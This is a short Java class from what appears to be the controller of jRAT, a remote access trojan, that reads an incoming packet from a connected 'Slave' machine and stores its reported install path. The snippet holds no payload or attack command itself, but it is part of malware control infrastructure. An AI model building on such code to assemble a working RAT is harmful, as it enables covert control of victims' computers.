package jrat.controller.packets.incoming;

import jrat.controller.Slave;


public class Packet10InitInstallPath implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String line = slave.readLine();
		slave.setServerPath(line);
	}

}
